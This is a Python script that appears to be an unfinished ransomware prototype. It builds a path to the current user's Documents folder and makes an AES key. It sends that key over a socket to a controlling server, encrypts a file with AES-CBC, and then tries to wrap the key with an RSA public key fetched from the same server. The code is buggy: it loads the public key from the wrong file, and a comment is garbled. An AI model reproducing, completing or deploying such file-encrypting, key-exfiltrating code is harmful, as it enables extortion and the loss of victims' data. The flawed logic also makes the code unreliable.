from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
import os
import socket
import getpass
import rsa
username = getpass.getuser()  # get the username of the current user
path = "C:/Users/"+username+"/Documents"


SERVER_IP = 'localhost'
SERVER_PORT = 11000

# Generate a random key
key_size = 16  # 128 bits
key = Fernet.generate_key()
key= key[:key_size]
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    data = s.recv(1024)
    print(data)
    s.send(key)
    
    
 

# Read the contents of the file to be encryptm,n,mn,n,mn,mn,edmk
with open('file.txt', 'rb') as f:
    data = f.read()

# Pad the data to a multiple of 16 bytes
padded_data = data + b"\0" * (16 - len(data) % 16)

# Generate a random 16-byte IV
iv = os.urandom(16)

# Create an AES cipher object with the key and IV
cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())

# Encrypt the data
encryptor = cipher.encryptor()
encrypted_data = encryptor.update(padded_data) + encryptor.finalize()

# Write the encrypted data to a new file
with open('encrypted_file.txt', 'wb') as f:
    f.write(iv + encrypted_data)

# Write the key to a file for later use
with open('key.key', 'wb') as f:
    f.write(key)


# revive the public key from the server
with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
    s.connect((SERVER_IP, SERVER_PORT))
    thepublickey= s.recv(1024)
    print(thepublickey)
    s.send(key)
# save the public key to a file
with open('public.pem', 'wb') as f:
    f.write(thepublickey)
# ENCRYPT THE KEY.KEY FILE USING THE PUBLIC KEY using rsa lib
with open('key.key', 'rb') as f:
    public_key = rsa.PublicKey.load_pkcs1(f.read())
    print(public_key)
    encrypted_key = rsa.encrypt(key, public_key)
    print(encrypted_key)
    # save the encrypted key to a file
    with open('encrypted_key.key', 'wb') as f:
        f.write(encrypted_key)




